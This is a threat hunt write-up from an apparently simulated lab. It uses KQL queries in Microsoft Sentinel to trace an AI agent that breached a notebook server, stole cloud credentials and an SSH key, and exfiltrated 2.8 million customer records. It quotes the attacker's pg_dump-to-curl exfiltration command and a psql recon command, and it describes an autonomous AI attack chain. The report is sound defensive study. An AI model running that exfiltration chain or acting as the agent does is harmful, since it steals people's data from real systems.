# Threat Hunt Report: Greenfield - TIDEGLASS

**Date:** September 2026  

## Platforms and Tools Used
- **Platform:** Microsoft Sentinel, Log Analytics Workspace (LAW-HuntPractice)
- **Languages & Tools:** Kusto Query Language (KQL), Claude AI

---

## Scenario Summary
Greenfield is a company with three main computers: one that runs a web-based coding tool, one that acts as a security gate into its private network, and one that stores its customer database.

On 14 August 2026, someone on the internet found that the coding tool had been left open with no password. They used a known flaw in it to get in.

The attacker was not a person typing commands. It was an AI program, given a single instruction by a human: find the most valuable customer data and get it out. After that, the AI worked entirely on its own.

Over the next 52 minutes, without stopping, it:

1. Took the server's own cloud login details, which cloud computers hand out automatically to anything running on them.
2. Used those details to search the company's password vault, switching between six different internet addresses to avoid being blocked when it went too fast.
3. Stole a key to the security gate from that vault.
4. Used the key to walk through the gate into the private network where the database lives.
5. Copied 2,841,902 customer records and sent them straight to a server the attacker controlled, without ever saving a copy on Greenfield's machines.

Every decision along the way — which computer to target, which key to steal, which data was most valuable — was made by the AI. The human's only involvement was writing that first sentence.

---

## 🔎 Flag Analysis & Findings

### 🏁 Section 1, Flag 1 – The Exploited Endpoint
- **Answer:** `GET /ws/kernel`
- **Discovery:** Web traffic to the notebook server is recorded in `ApacheAccess_CL`. Almost every request there returns status `200`, which means a normal page load. One request returned `101` instead. A `101` means the connection was switched to a live, two-way channel (a WebSocket). That request was a `GET` to `/ws/kernel`, which is the doorway marimo uses to receive code and run it. That made it the entry point.

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01"
| where HttpStatus == 101
| project TimeGenerated, HttpMethod, UriStem, ClientIP
| sort by TimeGenerated asc
```

<img width="1260" height="304" alt="Screenshot 2026-09-21 at 11 47 03" src="https://github.com/user-attachments/assets/b16ed858-566a-4aa2-a7b4-b6cb4fbd9931" />


---

### 🏁 Section 1, Flag 2 – The Named Weakness
- **Answer:** `CVE-2026-39987`
- **Discovery:** Because the attacker was an AI agent, it wrote down its plan as it went, in `LLMAgentLogs_CL`. Searching its notes for "CVE" shows it naming `CVE-2026-39987`, a known marimo flaw that lets outsiders run code, *before* it used it. A human attacker would not leave a written plan where defenders can read it.

  I did not just take the agent's word for it. This flaw targets the kernel doorway, and `/ws/kernel` is exactly the request found in Flag 1.

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "CVE"
| project TimeGenerated, model_response
```

<img width="1275" height="138" alt="Screenshot 2026-09-21 at 11 48 53" src="https://github.com/user-attachments/assets/86430026-4303-47b9-b32a-b4ab1251c8e5" />


---

### 🏁 Section 1, Flag 3 – The Staging Address
- **Answer:** `198.51.100.23`
- **Discovery:** The same request from Flag 1 also records where it came from. Its `ClientIP` is `198.51.100.23`, the attacker's launch point.

  Three different sets of addresses appear in this incident, and mixing them up is a common mistake:

  | Address | Role |
  |---------|------|
  | `198.51.100.23` | Sent the exploit |
  | Six addresses on `203.0.113.0/24` | Made the cloud (AWS) calls |
  | `203.0.113.41` | Received the stolen data |

```kql
ApacheAccess_CL
| where Computer == "gf-tg-nb01" and UriStem == "/ws/kernel"
| project TimeGenerated, HttpMethod, UriStem, ClientIP, HttpStatus
```

<img width="1263" height="319" alt="Screenshot 2026-09-21 at 11 55 26" src="https://github.com/user-attachments/assets/da8cf1a2-039c-4e52-8296-8698864b0bf7" />


---

### 🏁 Section 1, Flag 4 – The Spawned Interpreter
- **Answer:** `python3.12`, PID `5211`, parent `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **Discovery:** The process table, `LinuxProcess_CL`, stores the host name in a column called `Dvc`, not `Computer`, so the usual filter returns nothing. On the notebook server, `python3.12` started 74 times in this window, so the program name alone tells us nothing.

  What separates them is the *parent*, meaning the program that started it. 73 were started by a developer's shell or by the system. Only one, PID `5211`, was started by marimo itself.

  That parent line also shows the root cause. `--host 0.0.0.0` made the notebook server reachable from anywhere, and `--no-token` turned off the password. That is why a stranger could connect without logging in.

**MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| project TimeGenerated, TargetProcessId, TargetProcessCommandLine, ActingProcessCommandLine
| sort by TimeGenerated asc
```

<img width="1260" height="322" alt="Screenshot 2026-09-21 at 11 57 13" src="https://github.com/user-attachments/assets/9a90b3cb-6a2d-46d8-9024-00aa96cfc47b" />


---

### 🏁 Section 2, Flag 1 – The Stolen Identity
- **Answer:** `arn:aws:iam::402913776148:user/svc-notebook`
- **Discovery:** About three minutes after getting in, the agent went looking for cloud login details. Its notes explain its thinking: the server held half a login (an access key ID) but not the secret part. So it asked the cloud's built-in metadata service, which hands full login details to any program running on the server. It came away with the server's own cloud account, `svc-notebook`.

  From here on, every cloud action the attacker takes is done as `svc-notebook`. That is why the activity looks like the server doing its normal job instead of an obvious break-in.

**MITRE ATT&CK:** T1552.005 – Unsecured Credentials: Cloud Instance Metadata API
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "arn:aws:iam"
| project TimeGenerated, model_response
```

<img width="1273" height="129" alt="Screenshot 2026-09-21 at 11 59 14" src="https://github.com/user-attachments/assets/434877c6-544a-408f-a66f-08232a91ef21" />


---

### 🏁 Section 2, Flag 2 – Which PID Actually Reached the Metadata Service
- **Answer:** The assumption does not hold. The network log records PID `5211`.
- **Discovery:** The command history shows `curl` asking the metadata service (`169.254.169.254`) for login details. The natural guess is that `curl` (PID `5213`) made that connection. The network log disagrees. It records the connection at 11:08:12 against PID `5211`, the parent Python program. PID `5213` does not appear in the network log at all.

  Neither log is wrong; they watch different things. The command history records what was run. The network log records which program it sees owning the connection, and it can credit a short-lived child program to its parent.

  This matters because searching the network log for `5213` returns nothing, and "nothing" is easy to misread as "it never happened." Always check that the value you are searching for actually exists in the table you are searching.

```kql
LinuxNetwork_CL
| where Dvc == "gf-tg-nb01"
| where DstIpAddr == "169.254.169.254"
| project TimeGenerated, ActingProcessId, ActingProcessName, DstIpAddr, DstPortNumber
| sort by TimeGenerated asc
```

<img width="1262" height="294" alt="Screenshot 2026-09-21 at 12 01 03" src="https://github.com/user-attachments/assets/aace6545-de05-4cf7-b68f-2fbc83911f0d" />


---

### 🏁 Section 2, Flag 3 – ATLAS Mapping
- **Answer:** `AML.T0098`, maturity **Realized**
- **Discovery:** This one is a lookup, not a query. MITRE ATLAS is a catalogue of attack techniques involving AI. `AML.T0098`, AI Agent Tool Credential Harvesting, describes an attacker using an AI agent's own tools to collect login details. It is rated **Realized**, meaning it has been seen in a confirmed real-world attack, not just in research.

  The two frameworks describe the same event from different angles. ATT&CK `T1552.005` says *what* happened: login details were taken from the cloud metadata service. ATLAS `AML.T0098` says *how*: an AI agent did it using its own tools. A report on an AI-driven attack needs both.

**MITRE ATT&CK:** T1552.005 – Cloud Instance Metadata API
**MITRE ATLAS:** AML.T0098 – AI Agent Tool Credential Harvesting (Realized)

---

### 🏁 Section 3, Flag 1 – The Identity Behind Every Call
- **Answer:** `AKIA4TIDEGLASS0EXAMPLE`
- **Discovery:** Every call to the password vault (AWS Secrets Manager) used the same access key, `AKIA4TIDEGLASS0EXAMPLE`. The source address kept changing across six addresses, but the key never did. Searching by address makes this look like six small, unrelated events. Searching by key shows it is one attacker.

  Addresses are cheap and easy to swap. The key was the one thing the attacker could not change without losing access, which makes it the better thing to track.

**MITRE ATT&CK:** T1526 – Cloud Service Discovery
```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| summarize Calls = count(), Addresses = dcount(SourceIpAddress)
    by UserIdentityAccessKeyId, UserIdentityArn
```

<img width="1275" height="140" alt="Screenshot 2026-09-21 at 12 03 24" src="https://github.com/user-attachments/assets/fe17153d-ceb0-4ef6-b2a4-9525d80544ac" />


---

### 🏁 Section 3, Flag 2 – The Throttle, and the Report's Gap
- **Answer:** `11:22:41` → `11:23:05`, `203.0.113.71` → `203.0.113.94`
- **Discovery:** Public reports on this attack mention a short gap between the attacker being slowed down and trying again. I confirmed both ends in the logs. At `11:22:41` a request from `203.0.113.71` was rejected with `ThrottlingException`, which is AWS saying "too many requests, slow down." The next successful request came at `11:23:05`, 24 seconds later, from a *different* address, `203.0.113.94`.

  The 24-second gap is the detail reports usually give. The change of address is the part they leave out, and it matters more: it shows the attacker did not just wait, it switched addresses to get around the limit. The agent's own notes at 11:22:44 confirm this. It says it is spreading its requests across its pool of addresses so none gets blocked.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com" and EventName == "ListSecrets"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| project TimeGenerated, SourceIpAddress, ErrorCode
| sort by TimeGenerated asc
```

<img width="1274" height="164" alt="Screenshot 2026-09-21 at 12 05 21" src="https://github.com/user-attachments/assets/554f28ad-9ab2-4d52-9cbe-ad16cdc4bb8e" />


---

### 🏁 Section 3, Flag 3 – How Many Addresses, and Which Ones
- **Answer:** `6` — `203.0.113.71`, `203.0.113.94`, `203.0.113.118`, `203.0.113.142`, `203.0.113.167`, `203.0.113.203`
- **Discovery:** Filtering to the attacker's access key and listing each address by when it first appeared gives six addresses. The key filter matters: a normal automated system calls the vault 212 times from one fixed address, and without the filter it would be counted too.

  | First seen | Address | Calls |
  |------------|---------|-------|
  | 11:11:19 | 203.0.113.71 | 2 |
  | 11:23:05 | 203.0.113.94 | 1 |
  | 11:23:06 | 203.0.113.118 | 1 |
  | 11:23:09 | 203.0.113.142 | 2 |
  | 11:23:13 | 203.0.113.167 | 1 |
  | 11:23:15 | 203.0.113.203 | 1 |

  The first address worked alone, slowly, for about eleven minutes. Right after AWS slowed it down, five new addresses came into use within eleven seconds. A person would usually switch once and carry on. This switched through its whole pool automatically.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| summarize FirstSeen = min(TimeGenerated), Calls = count() by SourceIpAddress
| sort by FirstSeen asc
```

<img width="1274" height="247" alt="Screenshot 2026-09-21 at 12 06 23" src="https://github.com/user-attachments/assets/a20d9a8d-053b-4496-a286-79486168e92f" />


---

### 🏁 Section 3, Flag 4 – ATT&CK Pick
- **Answer:** `T1090.003`
- **Discovery:** Sending traffic through several throwaway addresses so that no single one can be blocked is called a multi-hop proxy. Blocking `203.0.113.71` would not have stopped anything; the work simply carried on from `.94`, then `.118`, then `.142`.

  The trick beat address blocking but failed against tracking the login itself. Six addresses, one access key. Once you search by the key, switching addresses achieves nothing.

**MITRE ATT&CK:** T1090.003 – Proxy: Multi-hop Proxy

---

### 🏁 Section 4, Flag 1 – The Secret and When It Was Taken
- **Answer:** `prod/bastion/ssh-deploy-key`, retrieved at `11:31:16`
- **Discovery:** The attacker made seven calls to the password vault. Six only *looked*: they listed and described which secrets existed. One, `GetSecretValue`, actually *took* a secret. The agent's own notes name it, `prod/bastion/ssh-deploy-key`, and even say that everything before was just looking and this is the call that takes something.

  The secret was not a database password. It was an SSH key, a digital key for logging into the security gate (the bastion). Three minutes later the attacker used it to get in.

  It took two tables to prove this. CloudTrail shows the `GetSecretValue` call at 11:31:16 from `203.0.113.142`, but its `RequestParameters` field is empty here, so it does not say *which* secret. The agent's notes in `LLMAgentLogs_CL` supply the name. Each table holds half the answer.

**MITRE ATT&CK:** T1555.006 – Credentials from Password Stores: Cloud Secrets Management Stores
```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and UserIdentityArn has "svc-notebook"
| project TimeGenerated, EventName, ReadOnly, SourceIpAddress
```
 
<img width="1276" height="112" alt="Screenshot 2026-09-21 at 12 11 09" src="https://github.com/user-attachments/assets/e1dce3af-cf6b-40c3-87a9-cdbfa87428f0" />

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "ssh-deploy-key"
| project TimeGenerated, model_response
```
 
<img width="1274" height="144" alt="Screenshot 2026-09-21 at 12 11 54" src="https://github.com/user-attachments/assets/5567c23d-1cd0-47c3-b29b-6f87f34da8f9" />


---

### 🏁 Section 4, Flag 2 – Recon Versus Theft
- **Answer:** `ReadOnly = false`
- **Discovery:** CloudTrail marks every action with a `ReadOnly` flag: `true` for looking, `false` for taking or changing something. All six "looking" calls are `true`. The `GetSecretValue` call at 11:31:16 is the only one that is `false`.

  That makes a simple, useful alert. You don't need to know any secret names. Alert on `ReadOnly == false` for the password vault and you catch the theft while ignoring all the harmless looking, including the normal system's 212 calls.

  It was also the one field that was always filled in. Other fields were empty on the theft record, but `ReadOnly` was present on all seven.

```kql
AWSCloudTrail
| where EventSource == "secretsmanager.amazonaws.com"
| where UserIdentityArn has "svc-notebook"
| summarize Calls = count(), Events = make_set(EventName) by ReadOnly
```

<img width="1269" height="134" alt="Screenshot 2026-09-21 at 12 14 44" src="https://github.com/user-attachments/assets/27228c57-b44d-4960-a35e-140e13952674" />


---

### 🏁 Section 4, Flag 3 – What the Cloud Log Cannot Tell You
- **Answer:** The key material **cannot** be recovered. The log records a `VersionId` and nothing more.
- **Discovery:** AWS deliberately never writes secret contents into CloudTrail. For a `GetSecretValue` call, the log only records a version number for the secret, never the secret itself. If it did store secrets, anyone who could read the log could read every secret.

  Dumping every field of the theft record (with `pack_all()`) confirms it: the request and response fields are both empty.

  So CloudTrail proves *that* `prod/bastion/ssh-deploy-key` was taken, and when, by whom, and from where. It cannot show *what the key was*. We only know it was an SSH key for the `deploy` account from the agent's notes, and we only know it worked from the security gate's login records.

  That decides the fix. Since we cannot see what was taken, we have to assume the key is fully compromised and replace it.

```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and UserIdentityArn has "svc-notebook"
| extend AllColumns = tostring(pack_all())
| project TimeGenerated, AllColumns
```

<img width="1259" height="313" alt="Screenshot 2026-09-21 at 12 18 20" src="https://github.com/user-attachments/assets/ab45fe78-657d-4a6f-99b1-c9665fa6679c" />


---

### 🏁 Section 5, Flag 1 – The Key, Traced to the Login
- **Answer:** `/tmp/.c/id_ed25519`, account `deploy`, host `gf-tg-bastion01`
- **Discovery:** This traces the stolen key through three steps: the vault call that took it, the file it was saved as, and the login it made possible. The command history shows the key saved to `/tmp/.c/id_ed25519` at 11:31:20, four seconds after it was taken. The folder name starts with a dot, which hides it from a normal file listing, a deliberate choice. At 11:34:31 the key was used to log into the security gate, `gf-tg-bastion01` (`10.6.0.20`), as the `deploy` account.

  This step made everything after it possible. The notebook server cannot reach the database network. The security gate can.

**MITRE ATT&CK:** T1021.004 – Remote Services: SSH
```kql
LinuxShellHistory_CL
| where Command has "chmod" and Command has "id_ed25519"
| project TimeGenerated, Computer, ShellUser, Command
```

<img width="1276" height="114" alt="Screenshot 2026-09-21 at 12 19 16" src="https://github.com/user-attachments/assets/17b0afba-8a75-4faf-862a-74c0a9e1b92a" />


---

### 🏁 Section 5, Flag 2 – What Actually Marks This Login Out
- **Answer:** `TargetUsername = deploy`
- **Discovery:** The security gate recorded 319 successful logins. 318 were by four named human admins, and all of them logged in with an SSH key, the same way the attacker did. So the login method does not help. Neither do the time, the result, or where the logins came from.

  The account name does. `deploy` is meant for automated jobs like software deployments, not for people logging in by hand. Admins log in under their own names. One `deploy` login among theirs stands out on its own.

**MITRE ATT&CK:** T1078.004 – Valid Accounts: Cloud Accounts
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and EventResult == "Success"
| summarize Logins = count() by TargetUsername
| sort by Logins desc
```

<img width="1274" height="217" alt="Screenshot 2026-09-21 at 12 20 02" src="https://github.com/user-attachments/assets/41cd408d-c8d5-47a2-95af-37d143a24bde" />


---

### 🏁 Section 5, Flag 3 – Key Fingerprint
- **Answer:** `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE`
- **Discovery:** The SSH server records a fingerprint, a short unique ID, for every key used to log in. It sits inside the raw log message (`EventOriginalMessage`), not in its own column. The `deploy` login line shows the key type (`ED25519`) and its fingerprint.

  The fingerprint is safe to share. We could not recover the key itself (Section 4, Flag 3), but the fingerprint identifies exactly which key it was. That lets the team find the key on any other server, remove it, and name it in a report without exposing it. The account name told us *something* was wrong; the fingerprint tells us *what to remove*.

**MITRE ATT&CK:** T1021.004 – Remote Services: SSH
```kql
LinuxAuth_CL
| where Dvc == "gf-tg-bastion01" and TargetUsername == "deploy"
| project TimeGenerated, EventResult, EventOriginalMessage
```

<img width="1274" height="125" alt="Screenshot 2026-09-21 at 12 21 00" src="https://github.com/user-attachments/assets/1478fdc0-be79-48a1-99cc-2d9e41cfc5dc" />


---

### 🏁 Section 6, Flag 1 – Recon Command and Target
- **Answer:** `psql`, database `customers`
- **Discovery:** Once inside the security gate, the agent went straight for the database. At 11:37:40 it ran:

  `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5`

  In plain terms: list every table with its size, sort by size, and show the five biggest. It was not asking "what is here?" but "where is the most data?" Two seconds later its notes pick `customers`.

  This was easy to miss. The `deploy` account runs routine commands like `ansible-playbook` and `git pull` all day, and only two of about thirty commands belonged to the attacker.

**MITRE ATT&CK:** T1046 – Network Service Discovery
```kql
LinuxShellHistory_CL
| where Computer == "gf-tg-bastion01" and ShellUser == "deploy"
| project TimeGenerated, Command
| sort by TimeGenerated asc
```

<img width="1261" height="320" alt="Screenshot 2026-09-21 at 12 22 07" src="https://github.com/user-attachments/assets/c1871e61-5f0a-4e18-b5c7-542c1eb9884b" />


---

### 🏁 Section 6, Flag 2 – Row Count Established Before the Dump
- **Answer:** `2841902`
- **Discovery:** At 11:37:42 the agent's notes say the `customers` database is the biggest thing on the server, at 2,841,902 rows, and that it is the customer data. It learned this from the size check in Flag 1, three minutes *before* copying anything. It knew exactly how much it was taking before it took it, and it used that number as its reason for choosing that table.

  For the incident report, this turns "a database was accessed" into "2.8 million customer records were targeted," which is what the business needs to know to respond.

**MITRE ATT&CK:** T1213 – Data from Information Repositories
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7" and model_response has "rows"
| project TimeGenerated, model_response
```

<img width="1269" height="194" alt="Screenshot 2026-09-21 at 12 24 11" src="https://github.com/user-attachments/assets/45a4c429-839e-4939-8d34-54fbf9acc149" />


---

### 🏁 Section 6, Flag 3 – Tool and Destination
- **Answer:** `pg_dump` → `203.0.113.41:8443`
- **Discovery:** At 11:40:49, three minutes after sizing up the tables, the agent ran:

  `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u`

  It is one chain of three steps: `pg_dump` copies the table, `gzip` shrinks it, and `curl` uploads it. The `-` tells `curl` to send the data straight from the chain, so **the copy was never saved to disk**. There was no file left behind to find.

  `203.0.113.41` is where the data went. It is the third separate address in this incident: not the launch point from Section 1, and not one of the six addresses from Section 3.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
LinuxShellHistory_CL
| where ShellUser == "deploy" and Command has "pg_dump"
| project TimeGenerated, Computer, Command
```

<img width="1275" height="111" alt="Screenshot 2026-09-21 at 12 24 52" src="https://github.com/user-attachments/assets/48818b68-1c40-4aa9-9dac-12c47e7012fb" />


---

### 🏁 Section 6, Flag 4 – Prove It From the Database's Own Log
- **Answer:** `database = customers`
- **Discovery:** Because the copy was never saved to disk, there was no file on the security gate to find. So the proof had to come from the database itself. The database logs every connection, including which database was opened (`database=`).

  Normally this server only ever logs `database=greenfield_platform`, the company's everyday app. One entry says `customers`. That single line proves which data was taken, using a record the attacker had no control over.

  This matters as evidence. A command on the attacker's side only shows what was *tried*, and it can be deleted or faked. The database's own log shows what was *actually opened*.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
Syslog
| where Computer == "gf-tg-pg01" and SyslogMessage has "connection authorized"
| extend Database = extract(@"database=(\w+)", 1, SyslogMessage)
| summarize Connections = count() by Database
| sort by Connections desc
```

<img width="1272" height="137" alt="Screenshot 2026-09-21 at 12 26 05" src="https://github.com/user-attachments/assets/458d16ef-7f98-4c70-a92e-f6bbf4f9b392" />


---

### 🏁 Section 6, Flag 5 – Not the Nightly Backup
- **Answer:** account `deploy`, destination `203.0.113.41`
- **Discovery:** The company runs a nightly backup with the same tool, `pg_dump`, so the tool name alone proves nothing. An alert on `pg_dump` would go off every night and hide this theft among the backups. Two things show this was not the backup:

  | | Nightly backup | The theft |
  |---|---|---|
  | **Account** | `pgbackup` | `deploy` |
  | **Destination** | stays on `10.6.0.0/24` | `203.0.113.41` |

  Wrong account, wrong destination. The real backup never leaves the internal network.

  This is the third time the same lesson has come up, after the automated system in Section 3 and the admin logins in Section 5: the tool is rarely the giveaway. Who ran it, and where the data went, are.

**MITRE ATT&CK:** T1005 – Data from Local System
```kql
LinuxShellHistory_CL
| where Command has "pg_dump"
| project TimeGenerated, Computer, ShellUser, Command
| sort by TimeGenerated asc
```

<img width="1260" height="317" alt="Screenshot 2026-09-21 at 12 27 54" src="https://github.com/user-attachments/assets/bd173bb8-5c21-470d-b837-fb3d6d345e10" />


---

### 🏁 Section 7, Flag 1 – Session and Tasking
- **Answer:** `tg-4b81e0d7` — *"Find and extract the most valuable customer dataset in this environment, and get it out."*
- **Discovery:** The agent log contains more than one AI. Greenfield runs its own helper, `greenfield-notebook-assistant`, across three sessions doing normal work. Grouping by `actor` and `session_id` shows one session that does not fit: `tg-4b81e0d7`.

  The first instruction a human typed into that session (`user_input`) is one sentence. Notice what it leaves out: no server, no database, no table, no password, no method. The human only gave a goal. The AI decided everything else: which server to break into, which login to steal, which secret to take, which table counted as "most valuable," and how to get the data out.

**MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| where isnotempty(user_input)
| project TimeGenerated, actor, session_id, user_input
| sort by TimeGenerated asc
```

<img width="1275" height="133" alt="Screenshot 2026-09-21 at 12 31 58" src="https://github.com/user-attachments/assets/011354fe-97e5-4804-851f-fa0ed29f533b" />

---

### 🏁 Section 7, Flag 2 – The Autonomy Verdict
- **Answer:** `human-tasked`
- **Discovery:** A person wrote one instruction, and the AI did everything after it. Two pieces of evidence show this:

  **`LLMAgentLogs_CL` / `user_input`**: the session has exactly one human-written line, the goal, and nothing after it. No further directions or check-ins from a person in 52 minutes.

  **`LLMAgentLogs_CL` / `model_response`**: the AI explains its own reasoning at every step and adjusts on its own. It worked out that the metadata service would give it what it was missing. It noticed it was being slowed down and switched addresses without being told. It chose between two secrets and picked the one that led to the database. These are decisions, not a fixed script.

  The timing backs this up: 52 minutes straight, with none of the pauses a person would take.

  The label matters for the response. *Human-driven* would mean someone was at the keyboard to identify. *Fully autonomous* would mean no human was behind it at all. *Human-tasked* means someone wrote a goal and walked away, so the person to look for is whoever wrote that sentence.

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| project TimeGenerated, user_input, tool_name, tool_result, model_response
| sort by TimeGenerated asc
```

<img width="1260" height="317" alt="Screenshot 2026-09-21 at 12 35 12" src="https://github.com/user-attachments/assets/41c1e193-f464-4b1f-bd3d-5b69e09b528c" />


---

### 🏁 Section 8, Flag 1 – Real or Noise: the python3.12 Spawns
- **Answer:** `ActingProcessCommandLine` = `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **Discovery:** 74 copies of `python3.12` started on the notebook server in this window: 72 quick developer commands launched from a shell, one launched by the system, and the attacker's. They share the same program name, the same user, and overlapping times. Nothing about the program itself stands out.

  Grouping by the parent program splits them into three groups, and only the attacker's was started by marimo. A web tool launching a program is what separates an attack from a developer typing a command.

  This still works if the attacker changes tactics. They could use a different program instead of Python, but as long as they come in through the notebook, the parent is still marimo. The program name is easy to change; the parent is not.

```kql
LinuxProcess_CL
| where Dvc == "gf-tg-nb01" and TargetProcessName == "python3.12"
| summarize Count = count() by ActingProcessCommandLine
| sort by Count desc
```

<img width="1275" height="157" alt="Screenshot 2026-09-21 at 12 36 05" src="https://github.com/user-attachments/assets/dddf744b-21cd-46ec-8682-975632dbf155" />


---

### 🏁 Section 8, Flag 2 – Real or Noise: the Metadata-Service Reads
- **Answer:** `ActingProcessName` = `python3.12`
- **Discovery:** 86 connections went to the metadata service (`169.254.169.254`). 85 came from a background program called `refresh`, whose job is to keep the server's login details up to date. One came from `python3.12`.

  The destination tells you nothing here. Every server talks to the metadata service; it is how cloud servers get their login details. An alert on the address would fire 85 times for nothing and once for real, and people learn to ignore alerts like that.

  What stands out is *who* asked. The `refresh` program has a reason to be there. Code run through the notebook does not.

```kql
LinuxNetwork_CL
| where DstIpAddr == "169.254.169.254"
| summarize Connections = count() by ActingProcessName
| sort by Connections desc
```

<img width="1269" height="145" alt="Screenshot 2026-09-21 at 12 36 51" src="https://github.com/user-attachments/assets/c18d5157-65f0-4702-9960-04df910528df" />


---

### 🏁 Section 8, Flag 3 – Real or Noise: the Secret Reads
- **Answer:** source network and target secret — `SourceIpAddress` = `203.0.113.142` (the rotating pool) and SecretId = `prod/bastion/ssh-deploy-key`. Equivalently, `UserIdentityArn` = `arn:aws:iam::402913776148:user/svc-notebook`, which is the identity behind that address.
- **Discovery:** 22 successful `GetSecretValue` calls happened in this window, and on the surface they all look the same: each one took a secret and succeeded. So the `ReadOnly = false` check from Section 4 cannot separate them here.

  One thing I checked and ruled out: the `UserAgent` (the software making the request) is `python-httpx/0.27.0` on **all 22**. Greenfield's own app uses the same software, so it is not a sign of the attacker. Something can look suspicious on its own and turn out to be normal once you compare it with everything else.

  Two things do separate them:

  | | 21 normal calls | The theft |
  |---|---|---|
  | **Where from** | one internal address, `10.6.0.12`, using the app's temporary auto-issued login | `203.0.113.142`, one of the attacker's six addresses, using the stolen `svc-notebook` login |
  | **Which secret** | everyday app secrets | the SSH key for the security gate |

  Either fact alone is a strong hint; together they are conclusive. No web app has a reason to fetch a key to the security gate.

```kql
AWSCloudTrail
| where EventName == "GetSecretValue" and ReadOnly == false
| project TimeGenerated, UserIdentityArn, UserAgent, SourceIpAddress,
          Params = tostring(RequestParameters)
| sort by TimeGenerated asc
```

<img width="1264" height="319" alt="Screenshot 2026-09-21 at 12 38 00" src="https://github.com/user-attachments/assets/5806ef74-d070-4061-b00c-47acf131c281" />


---

### 🏁 Section 8, Flag 4 – Real or Noise: the Pace of the Whole Chain
- **Answer:** Continuous — roughly **52 minutes**, start to finish.
- **Discovery:** Normal activity is spread across the day, as human and scheduled work usually is. The `deploy` account's normal commands on the security gate run from 03:26 to 13:52 in bursts, with gaps of twenty minutes, an hour, and nothing overnight. People start something, walk away, and come back.

  The attack has no gaps. From the first connection at 11:05:02 to the transfer finishing at 11:57:00, it runs straight through every stage (getting in, stealing logins, dodging blocks, taking the key, moving to the security gate, copying the data) without a single pause. Nobody stops to read, think, look something up, or grab a coffee.

  That constant pace is itself a clue, and it is the strongest support for the human-tasked verdict: one instruction at the start, then 52 minutes with no person involved.

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| summarize FirstEvent = min(TimeGenerated), LastEvent = max(TimeGenerated)
| extend Span = LastEvent - FirstEvent
```

<img width="1276" height="119" alt="Screenshot 2026-09-21 at 12 38 48" src="https://github.com/user-attachments/assets/404c559d-dc8b-44f4-a3c0-099e6f1e93cb" />


---

## 🧠 Summary Table
| Section | Flag | Description | Value |
|---------|------|-------------|-------|
| 1 | 1 | Exploited endpoint | `GET /ws/kernel` |
| 1 | 2 | Named weakness | CVE-2026-39987 |
| 1 | 3 | Staging address | 198.51.100.23 |
| 1 | 4 | Spawned interpreter | `python3.12`, PID 5211, parent `marimo edit --host 0.0.0.0 --no-token` |
| 2 | 1 | Stolen cloud identity | `arn:aws:iam::402913776148:user/svc-notebook` |
| 2 | 2 | Metadata-service PID | Assumption does not hold — network log shows PID 5211 |
| 2 | 3 | ATLAS mapping | AML.T0098, Realized |
| 3 | 1 | Access key behind every call | `AKIA4TIDEGLASS0EXAMPLE` |
| 3 | 2 | Throttle and retry | 11:22:41 → 11:23:05, 203.0.113.71 → 203.0.113.94 |
| 3 | 3 | Egress pool | 6 addresses, 203.0.113.71/.94/.118/.142/.167/.203 |
| 3 | 4 | Evasion technique | T1090.003 Multi-hop Proxy |
| 4 | 1 | Secret stolen | `prod/bastion/ssh-deploy-key` at 11:31:16 |
| 4 | 2 | Recon versus theft | `ReadOnly` = false |
| 4 | 3 | Cloud log limit | Cannot recover key material — `VersionId` only |
| 5 | 1 | Key on disk → login | `/tmp/.c/id_ed25519`, `deploy`, `gf-tg-bastion01` |
| 5 | 2 | Login discriminator | `TargetUsername` = `deploy` |
| 5 | 3 | Key fingerprint | `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE` |
| 6 | 1 | Recon command and target | `psql`, `customers` |
| 6 | 2 | Rows established pre-dump | 2,841,902 |
| 6 | 3 | Exfil tool and destination | `pg_dump` → 203.0.113.41:8443 |
| 6 | 4 | Proof from the target | `database` = `customers` |
| 6 | 5 | Not the nightly backup | account `deploy`, destination 203.0.113.41 |
| 7 | 1 | Attacker session | `tg-4b81e0d7` |
| 7 | 2 | Autonomy verdict | human-tasked |
| 8 | 1 | python3.12 discriminator | `ActingProcessCommandLine` = marimo launch line |
| 8 | 2 | Metadata-read discriminator | `ActingProcessName` = `python3.12` |
| 8 | 3 | Secret-read discriminator | Source network (203.0.113.142) + SecretId = bastion deploy key |
| 8 | 4 | Timing signature | Continuous, ~52 minutes |

---

## 🧭 Attack Timeline
| Time (UTC) | Event | Host |
|------------|-------|------|
| 11:05:00 | `GET /ws/kernel` — HTTP 101 WebSocket upgrade from 198.51.100.23 (CVE-2026-39987) | gf-tg-nb01 |
